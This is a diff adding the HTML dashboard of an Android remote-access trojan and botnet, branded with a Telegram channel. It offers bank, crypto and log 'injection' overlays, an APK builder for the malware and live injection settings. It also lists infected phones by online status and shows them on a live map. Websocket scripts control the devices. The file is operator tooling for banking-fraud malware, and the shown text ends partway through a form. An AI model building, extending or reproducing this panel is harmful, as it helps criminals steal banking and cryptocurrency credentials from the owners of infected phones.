@@ -1,0 +1,1034 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="ankrupt RAT | Admin Panel">
+	<meta name="keyword" content="ankrupt RAT | Admin Panel">
+	<link rel="icon" href="assets/images/favicon.ico" type="image/x-icon"> <!--[ Favicon]-->
+	<title>Telegram Channel: @androidbotnettt Botnet | Admin Panel</title>
+	
+	<!--[ Favicon]-->
+	<link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
+	<link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png">
+
+	<link rel="stylesheet" href="assets/css/prism.min.css">
+	<link rel="stylesheet" href="assets/css/jsvectormap.min.css">
+	
+	<!--[ Template main css file ]-->
+	
+	<link rel="stylesheet" href="assets/css/style.min.css">
+	<script src="../b4j_ws.js"></script>
+    <script src="../reconnecting-websocket.js"></script>
+</head>
+
+<body data-bvite="theme-CeruleanBlue" class="layout-border svgstroke-a layout-default">
+
+	<!-- start: main grid layout -->
+	<main class="container-fluid px-0">
+
+		<!-- start: project logo -->
+		<div class="px-md-4 px-2 pt-2 pb-2 brand" data-bs-theme="none">
+			<div>
+				<div class="d-flex align-items-center pt-1">
+					<button class="btn d-inline-flex d-xl-none border-0 p-0 pe-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvas_Navbar">
+						<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+							<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+							<path d="M4 6l16 0"></path>
+							<path d="M4 12l16 0"></path>
+							<path d="M4 18l16 0"></path>
+						</svg>
+					</button>
+					<!--[ Start:: Brand Logo icon ]-->
+					<a href="dashboard.html" class="brand-icon text-decoration-none d-flex align-items-center" title="BVITE Admin Template">
+					
+					<img src="assets/images/small2.png" style=" max-width: 190px; " />
+					
+					
+						
+					</a>
+				</div>
+				 
+			</div>
+			<div class="d-none layout-a-action">
+				<div class="mb-2">
+					<a class="d-flex align-items-center lh-sm p-0" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false" title="User">
+						<img class="avatar rounded-circle border border-3 shadow" src="assets/images/profile_av.png" alt="avatar">
+					</a>
+					<div class="dropdown-menu dropdown-menu-end shadow p-2 p-xl-3 rounded-4">
+						<div class="bg-body p-3 rounded-3">
+							<h4 class="mb-1 title-font text-gradient">Admin</h4>
+							<p class="small text-muted">Admin@Admin.com</p>
+							<input type="text" class="form-control form-control-sm" placeholder="Update my status">
+						</div>
+						 
+						<a class="btn py-2 btn-primary w-100 mt-3 rounded-pill" href="signin.html" role="button">Logout</a>
+						<div class="mt-3 text-center small">
+							<a class="text-muted me-1" href="#!">Privacy policy</a>•<a class="text-muted mx-1" href="#!">Terms</a>•<a class="text-muted ms-1" href="#!">Cookies</a>
+						</div>
+					</div>
+				</div>
+				<a href="#" class="btn p-1" title="Sign out">
+					<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M7 6a7.75 7.75 0 1 0 10 0"></path>
+						<path d="M12 4l0 8"></path>
+					</svg>
+				</a>
+			</div>
+		</div>
+
+		<!-- start: page header -->
+		<header class="px-md-4 px-2" data-bs-theme="none">
+			<div class="d-flex justify-content-between align-items-center py-2 w-100">
+			 
+				 
+
+				<div class="dropdown main-search me-md-4 w-50 d-none d-md-inline-flex">
+					<div class="w-100" data-bs-toggle="dropdown" data-bs-auto-close="outside">
+						<svg class="svg-stroke search-icon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+							<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+							<path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0"></path>
+							<path d="M21 21l-6 -6"></path>
+						</svg>
+						<input type="text" class="form-control" placeholder="Search Devices, Banks, Apps..." aria-label="Search Devices, Banks, Apps..." id="txtsearch" autocomplete="off">
+					</div>
+					<div class="dropdown-menu shadow rounded-4 p-3 p-xl-4 w-100" id="divsearchresultscointainer"
+					style="display:none !important;"
+					>
+						<h6 class="fl-title" style="--text-color: var(--theme-color1)">Search Results</h6>
+						
+						<div class="d-flex flex-column mb-4" id="divsearchresults">
+							
+						</div>
+						
+					</div>
+				</div>
+			
+				<ul class="header-menu flex-grow-1">
+					<!--[ Start:: notification ]-->
+					<li class="nav-item dropdown px-md-1 d-none d-md-inline-flex">
+						<a class="dropdown-toggle gray-6" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false" title="notification">
+							<span class="bullet-dot bg-primary animation-blink"></span>
+							<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+								<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+								<path d="M10 5a2 2 0 0 1 4 0a7 7 0 0 1 4 6v3a4 4 0 0 0 2 3h-16a4 4 0 0 0 2 -3v-3a7 7 0 0 1 4 -6"></path>
+								<path d="M9 17v1a3 3 0 0 0 6 0v-1"></path>
+								<path d="M21 6.727a11.05 11.05 0 0 0 -2.794 -3.727"></path>
+								<path d="M3 6.727a11.05 11.05 0 0 1 2.792 -3.727"></path>
+							 </svg>
+						</a>
+						<div class="dropdown-menu shadow rounded-4 notification" id="NotificationsDiv">
+							<div class="card border-0">
+								<div class="card-header d-flex justify-content-between align-items-center py-3">
+									<h4 class="mb-0 text-gradient title-font">Notifications</h4>
+									
+								</div>
+								<ul class="card-body p-0 list-unstyled mb-0 custom_scroll ps-2" style="height: 400px;" id="divnotifications">
+									<li class="pe-2">
+										<a class="d-flex p-lg-3 p-2 rounded-3" href="javascript:void(0);">
+											<div class="avatar sm">
+												<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+													<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+													<path d="M7 11v8a1 1 0 0 1 -1 1h-2a1 1 0 0 1 -1 -1v-7a1 1 0 0 1 1 -1h3a4 4 0 0 0 4 -4v-1a2 2 0 0 1 4 0v5h3a2 2 0 0 1 2 2l-1 5a2 3 0 0 1 -2 2h-7a3 3 0 0 1 -3 -3"></path>
+												</svg>
+											</div>
+											<div class="flex-fill ms-3">
+												<span class="d-flex justify-content-between"><small class="text-primary">No new notifications</small></span>
+											
+											</div>
+										</a>
+									</li>
+									 
+								</ul>
+							</div>
+						</div>
+					</li>
+					<li class="nav-item py-2 py-md-1 col-auto">
+						<div class="vr d-none d-sm-flex h-100 mx-sm-2"></div>
+					</li>
+					<!--[ Start:: language ]-->
+					<li class="nav-item dropdown px-md-1 d-none d-md-inline-flex">
+						<a class="dropdown-toggle gray-6" href="#" data-bs-toggle="dropdown" role="button" title="language">
+							<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+								<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+								<path d="M3 12a9 9 0 1 0 18 0a9 9 0 0 0 -18 0"></path>
+								<path d="M3.6 9h16.8"></path>
+								<path d="M3.6 15h16.8"></path>
+								<path d="M11.5 3a17 17 0 0 0 0 18"></path>
+								<path d="M12.5 3a17 17 0 0 1 0 18"></path>
+							</svg>
+						</a>
+						<ul class="dropdown-menu shadow rounded-4 p-2 p-xl-3 li_animate">
+							<li class="mb-1"><a class="dropdown-item rounded-pill active" href="#" title="language">English</a></li>
+							<li class="mb-1"><a class="dropdown-item rounded-pill" href="#" title="language">Italian</a></li>
+							<li class="mb-1"><a class="dropdown-item rounded-pill" href="#" title="language">Spanish</a></li>
+							
+						</ul>
+					</li>
+					<!--[ Start:: theme light/dark ]-->
+					<li class="nav-item dropdown px-md-1">
+						<a class="dropdown-toggle gray-6" href="#" id="bd-theme" data-bs-toggle="dropdown" aria-expanded="false">
+							<svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24" class="theme-icon-active"><use href="#sun-fill"></use></svg>
+						</a>
+						<ul class="dropdown-menu dropdown-menu-end p-2 p-xl-3 shadow rounded-4" aria-labelledby="bd-theme">
+							<li class="mb-1"><a class="dropdown-item rounded-pill" href="#" data-bs-theme-value="light"><svg class="avatar xs me-2 opacity-50 theme-icon" fill="currentColor"><use href="#sun-fill"></use></svg> Light</a></li>
+							<li class="mb-1"><a class="dropdown-item rounded-pill active" href="#" data-bs-theme-value="dark"><svg class="avatar xs me-2 opacity-50 theme-icon" fill="currentColor"><use href="#moon-stars-fill"></use></svg> Dark</a></li>
+							<li class="mb-1"><a class="dropdown-item rounded-pill" href="#" data-bs-theme-value="auto"><svg class="avatar xs me-2 opacity-50 theme-icon" fill="currentColor"><use href="#circle-half"></use></svg> Auto</a></li>
+						</ul>
+						<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16" style="display: none;">
+							<symbol id="sun-fill" viewBox="0 0 16 16">
+								<path d="M12 8a4 4 0 1 1-8 0 4 4 0 0 1 8 0zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+							</symbol>
+							<symbol id="moon-stars-fill" viewBox="0 0 16 16">
+								<path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+								<path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.734 1.734 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.734 1.734 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.734 1.734 0 0 0 1.097-1.097l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.156 1.156 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.156 1.156 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"/>
+							</symbol>
+							<symbol id="circle-half" viewBox="0 0 16 16">
+								<path d="M8 15A7 7 0 1 0 8 1v14zm0 1A8 8 0 1 1 8 0a8 8 0 0 1 0 16z"/>
+							</symbol>
+						</svg>
+					</li>
+					 
+					<li class="nav-item py-2 py-md-1 col-auto">
+						<div class="vr d-none d-sm-flex h-100 mx-sm-2"></div>
+					</li>
+					<!--[ Start:: user detail ]-->
+					<li class="nav-item user ms-3">
+						<a class="dropdown-toggle gray-6 d-flex text-decoration-none align-items-center lh-sm p-0" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false" title="User" data-bs-auto-close="outside">
+							<img class="avatar rounded-circle border border-3" src="assets/images/xs/devicedetails1.png" alt="avatar">
+							<span class="ms-2 fs-6 d-none d-sm-inline-flex">Admin</span>
+						</a>
+						<div class="dropdown-menu dropdown-menu-end shadow p-2 p-xl-3 rounded-4">
+							<div class="bg-body p-3 rounded-3">
+								<h4 class="mb-1 title-font text-gradient">Admin</h4>
+								<p class="small text-muted">Admin@Admin.com</p>
+							 
+							</div>
+						 
+							<a class="btn py-2 btn-primary w-100 mt-3 rounded-pill" href="index.html" role="button">Logout</a>
+							 
+						</div>
+					</li>
+				</ul>
+			</div>
+		</header>
+
+		<!-- start: page menu link -->
+		<aside class="ps-4 pe-3 py-3 sidebar" data-bs-theme="none">
+			<nav class="navbar navbar-expand-xl py-0">
+				<div class="offcanvas offcanvas-start" data-bs-scroll="true" tabindex="-1" id="offcanvas_Navbar">
+					
+					
+					<div class="offcanvas-body flex-column custom_scroll ps-4 ps-xl-0">
+						<!-- start: Workspace -->
+						<h6 class="fl-title title-font ps-2 small text-uppercase text-muted" style="--text-color: var(--theme-color1)">Workspace</h6>
+						<ul class="list-unstyled mb-4 menu-list">
+							<li>
+								<a href="dashboard.html" aria-label="My Dashboard">
+									<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+										<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+										<path d="M5 12l-2 0l9 -9l9 9l-2 0"></path>
+										<path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7"></path>
+										<path d="M10 12h4v4h-4z"></path>
+									</svg>
+									<span class="mx-2">Dashboard</span>
+								</a>
+							</li>
+							<li>
+								<a href="injections.html?id=1" aria-label="Banks Injections">
+									<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+										<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+										<path d="M17 8v-3a1 1 0 0 0 -1 -1h-10a2 2 0 0 0 0 4h12a1 1 0 0 1 1 1v3m0 4v3a1 1 0 0 1 -1 1h-12a2 2 0 0 1 -2 -2v-12"></path>
+										<path d="M20 12v4h-4a2 2 0 0 1 0 -4h4"></path>
+									</svg>
+									<span class="mx-2">Banks</span>
+								</a>
+							</li>
+							<li>
+								<a href="injections.html?id=2" aria-label="Crypto Injections">
+									<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+										<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+										<path d="M17 8v-3a1 1 0 0 0 -1 -1h-10a2 2 0 0 0 0 4h12a1 1 0 0 1 1 1v3m0 4v3a1 1 0 0 1 -1 1h-12a2 2 0 0 1 -2 -2v-12"></path>
+										<path d="M20 12v4h-4a2 2 0 0 1 0 -4h4"></path>
+									</svg>
+									<span class="mx-2">Crypto</span>
+								</a>
+							</li>
+							<li>
+								<a href="injections.html?id=3" aria-label="Logs Injections">
+									<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+										<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+										<path d="M17 8v-3a1 1 0 0 0 -1 -1h-10a2 2 0 0 0 0 4h12a1 1 0 0 1 1 1v3m0 4v3a1 1 0 0 1 -1 1h-12a2 2 0 0 1 -2 -2v-12"></path>
+										<path d="M20 12v4h-4a2 2 0 0 1 0 -4h4"></path>
+									</svg>
+									<span class="mx-2">Logs</span>
+								</a>
+							</li>
+						</ul>
+						 
+						<!-- start: Plugin -->
+						<h6 class="fl-title title-font ps-2 small text-uppercase text-muted" style="--text-color: var(--theme-color3)">Globals</h6>
+						<ul class="list-unstyled mb-4 menu-list">
+							 
+							<li>
+								<a href="#" aria-label="Datatables"  data-bs-toggle="modal" data-bs-target="#exampleModalLgapkbuilder">
+									<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+										<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+										<path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+										<path d="M4 12l16 0"></path>
+										<path d="M12 4l0 16"></path>
+									</svg>
+									<span class="mx-2">APK Builder</span>
+								</a>
+							</li>
+							<li>
+								<a href="LiveInjectionSettings.html" aria-label="Flatpickr">
+									<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+										<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+										<path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4"></path>
+										<path d="M18 14v4h4"></path>
+										<path d="M18 18m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0"></path>
+										<path d="M15 3v4"></path>
+										<path d="M7 3v4"></path>
+										<path d="M3 11h16"></path>
+									</svg>
+									<span class="mx-2">Live Injections</span>
+								</a>
+							</li>
+							
+							<!-- <li> -->
+								<!-- <a href="blockedphones.html" aria-label="Inputmask"> -->
+									<!-- <svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> -->
+										<!-- <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> -->
+										<!-- <path d="M12 3a3 3 0 0 0 -3 3v12a3 3 0 0 0 3 3"></path> -->
+										<!-- <path d="M6 3a3 3 0 0 1 3 3v12a3 3 0 0 1 -3 3"></path> -->
+										<!-- <path d="M13 7h7a1 1 0 0 1 1 1v8a1 1 0 0 1 -1 1h-7"></path> -->
+										<!-- <path d="M5 7h-1a1 1 0 0 0 -1 1v8a1 1 0 0 0 1 1h1"></path> -->
+										<!-- <path d="M17 12h.01"></path> -->
+										<!-- <path d="M13 12h.01"></path> -->
+									<!-- </svg> -->
+									<!-- <span class="mx-2">Blocked Phones</span> -->
+								<!-- </a> -->
+							<!-- </li> -->
+							<li>
+								<a href="#" aria-label="Jsvectormap">
+									<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+										<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+										<path d="M12 18.5l-3 -1.5l-6 3v-13l6 -3l6 3l6 -3v7.5"></path>
+										<path d="M9 4v13"></path>
+										<path d="M15 7v5.5"></path>
+										<path d="M21.121 20.121a3 3 0 1 0 -4.242 0c.418 .419 1.125 1.045 2.121 1.879c1.051 -.89 1.759 -1.516 2.121 -1.879z"></path>
+										<path d="M19 18v.01"></path>
+									</svg>
+									<span class="mx-2">Settings</span>
+								</a>
+							</li>
+							<!-- <li> -->
+								<!-- <a href="docs/sortablejs.html" aria-label="Sortablejs"> -->
+									<!-- <svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> -->
+										<!-- <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> -->
+										<!-- <path d="M5 5m0 .5a.5 .5 0 0 1 .5 -.5h4a.5 .5 0 0 1 .5 .5v4a.5 .5 0 0 1 -.5 .5h-4a.5 .5 0 0 1 -.5 -.5z"></path> -->
+										<!-- <path d="M5 14m0 .5a.5 .5 0 0 1 .5 -.5h4a.5 .5 0 0 1 .5 .5v4a.5 .5 0 0 1 -.5 .5h-4a.5 .5 0 0 1 -.5 -.5z"></path> -->
+										<!-- <path d="M14 15l3 3l3 -3"></path> -->
+										<!-- <path d="M17 18v-12"></path> -->
+									<!-- </svg> -->
+									<!-- <span class="mx-2">Notes</span> -->
+								<!-- </a> -->
+							<!-- </li> -->
+							 
+						</ul>
+						 
+						<div class="bg-gradient rounded-3 p-4 text-white mt-4 promo">
+							<p class="lh-sm fw-light">Welcome to the most powerful RAT ever built.</p>
+							
+						</div>
+					</div>
+				</div>
+			</nav>
+		</aside>
+		
+		<!-- start: page icon link -->
+		<aside class="ps-4 pe-3 py-3 rightbar" data-bs-theme="none">
+			<div class="navbar navbar-expand-xxl px-3 px-xl-0 py-0">
+				<div class="offcanvas offcanvas-end" data-bs-scroll="true" tabindex="-1" id="offcanvas_rightbar" aria-labelledby="offcanvas_rightbar">
+					<div class="offcanvas-header" style="background: var(--body-color);">
+						<h5 class="offcanvas-title">Rightbar quick access</h5>
+						<button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+					</div>
+					<div class="offcanvas-body flex-column custom_scroll" style="background: var(--body-color);">
+						<ul class="nav nav-tabs tab-card justify-content-between px-0" role="tablist">
+							<li class="nav-item" role="presentation"><button class="nav-link pt-0 active" data-bs-toggle="pill" data-bs-target="#pills_today" type="button" role="tab">Admin Logs</button>
+							
+							</li>
+							<a href="#" id="btndeleteadminlogs" class="btn btn-outline-danger" style=" font-size: 14px; ">Delete All Logs</a>
+						</ul>
+						<div class="tab-content mt-3">
+							<!--[ Start:: tab pane today ]-->
+							<div class="tab-pane fade show active" id="pills_today" role="tabpanel">
+								
+								<ul class="row g-4 list-unstyled li_animate mb-0 trending-blog" id="divadminlogs">
+									
+									
+									<li class="col-12 d-flex align-items-start">
+										
+										<div class="text-truncate ms-2 ps-3 border-start dashed border-0">
+											<span class="d-flex align-items-center mb-3">
+												Loading...
+											</span>
+											 
+										</div>
+									</li>
+								</ul>
+							</div>
+							
+						</div>
+					</div>
+				</div>
+			</div>
+		</aside>
+
+		<!-- start: page header area -->
+		<div class="px-md-4 px-2 py-2 page-header" data-bs-theme="none">
+
+			<div class="d-flex align-items-center">
+				<button class="btn d-none d-xl-inline-flex me-3 px-0 sidebar-toggle" type="button">
+					<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+						<path d="M9 4v16"></path>
+						<path d="M15 10l-2 2l2 2"></path>
+					</svg>
+				</button>
+				<ol class="breadcrumb mb-0 bg-transparent">
+					 <li class="breadcrumb-item"><a href="dashboard.html" title="home">Telegram Channel: @androidbotnettt</a></li>
+					<li class="breadcrumb-item active"><a href="dashboard.html" title="App">Dashoard</a></li>
+					
+				</ol>
+			</div>
+			<ul class="list-unstyled action d-flex align-items-center mb-0">
+				 
+				 
+				<li class="pe-3 col-auto">
+					<div class="vr d-none d-sm-flex h-100 mx-sm-2"></div>
+				</li>
+				<li class="d-none d-xxl-inline-flex">
+					<button class="btn px-0 rightbar-toggle" type="button">
+						<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+							<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+							<path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+							<path d="M15 4v16"></path>
+							<path d="M9 10l2 2l-2 2"></path>
+						</svg>
+					</button>
+				</li>
+				<li class="d-inline-flex d-xxl-none">
+					<button class="btn border-0 p-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvas_rightbar">
+						<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+							<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+							<path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+							<path d="M15 4v16"></path>
+							<path d="M9 10l2 2l-2 2"></path>
+						</svg>
+					</button>
+				</li>
+			</ul>
+
+		</div>
+
+		<!-- start: page body area -->
+		<div class="ps-md-4 pe-md-3 px-2 py-3 page-body">
+			
+			<ul class="nav nav-tabs tab-card" role="tablist">
+	 
+	<li class="nav-item"><a id="btnonlinescreen" class="nav-link active" data-bs-toggle="tab" href="#" role="tab">Online (Screen On)</a></li>
+	<li class="nav-item"><a id="btnonlinescreenoff" class="nav-link" data-bs-toggle="tab" href="#" role="tab">Online (Screen Off)</a></li>
+	<li class="nav-item"><a id="btndeviceoffline" class="nav-link" data-bs-toggle="tab" href="#" role="tab">Offline</a></li>
+	<li class="nav-item"><a id="btnlivemap" class="nav-link" data-bs-toggle="tab" href="#" role="tab">Live MAP</a></li>
+	
+	
+</ul>
+<div class="table-responsive">
+	
+	<div id="divonlinescreenon">
+	
+	
+
+	</div>
+	
+	
+	
+	
+		
+	
+</div>
+
+
+<div id="divlivemap" >
+		
+	</div>
+
+           
+        </div>
+
+		<!-- start: page footer -->
+		<footer class="px-md-4 px-2">
+			<p class="mb-0 text-muted">© 2023 <a href="#" title="Telegram Channel: @androidbotnettt">Telegram Channel: @androidbotnettt Botnet</a>, All Rights Reserved.</p>
+		</footer>
+		
+	</main>
+
+	
+<!--[ bvite template vender js ]-->
+	<script src="assets/bundles/libscripts.bundle.js"></script>
+	<script src="assets/bundles/prism.bundle.js"></script>
+	<script src="assets/bundles/jsvectormap.bundle.js"></script>
+
+
+	<script src="assets/js/main.js"></script>
+
+	
+   <script>
+	  $(document).ready(function() {
+		b4j_connect("/deviceslist/ws");
+	  });
+	</script>
+	
+	<input type="text" value="0" id="txtinjectdeviceid" style="display:none;" />
+	<script>
+		function injectpopup(val){
+			document.getElementById("txtinjectdeviceid").value = val;
+		}
+		function deletedevice(val){
+			b4j_raiseEvent("delete_device", {val});
+		}
+	</script>
+ 
+							<div class="modal fade" id="exampleModalLg" tabindex="-1" aria-labelledby="exampleModalLgLabel" aria-hidden="true" style="display: none;">
+								<div class="modal-dialog modal-lg">
+									<div class="modal-content">
+										<div class="modal-header">
+											<h5 class="modal-title h4" id="exampleModalLgLabel">Add Injection</h5>
+											<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+										</div>
+										<div class="modal-body">
+											
+											<div class="card-body card-main-one">
+	<div class="row">
+		<div class="mb-3 col-md-6 col-12">
+			<label class="col-form-label">Injection Name</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				<select id="cmbinjections" class="form-control">
+				
+				</select>
+				
+				
+				<div class="form-icon position-absolute">
+					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person" viewBox="0 0 16 16">
+						<path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/>
+					</svg>
+				</div>
+			</fieldset>
+		</div>
+		 
+		 
+		  
+		<div class="col-12">
+			<button class="btn btn-primary" id="btnaddinject">Add</button>
+			<button class="btn btn-outline-secondary" id="btncancel" data-bs-dismiss="modal">Cancel</button>
+		</div>
+	</div>
+	
+	</div>
+											
+											
+											
+										</div>
+									</div>
+								</div>
+							</div>
+							
+							
+							
+							<div class="modal fade" id="exampleModalLgNotes" tabindex="-1" aria-labelledby="exampleModalLgLabel1" aria-hidden="true" style="display: none;">
+								<div class="modal-dialog modal-lg">
+									<div class="modal-content">
+										<div class="modal-header">
+											<h5 class="modal-title h4" id="exampleModalLgLabel1">Add Notes</h5>
+											<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+										</div>
+										<div class="modal-body">
+											
+											<div class="card-body card-main-one">
+	<div class="row">
+		<div class="mb-3 col-md-6 col-12">
+			<label class="col-form-label">Notes</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				 <input type="text" id="txtnotes" class="form-control" />
+				
+				<div class="form-icon position-absolute">
+					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person" viewBox="0 0 16 16">
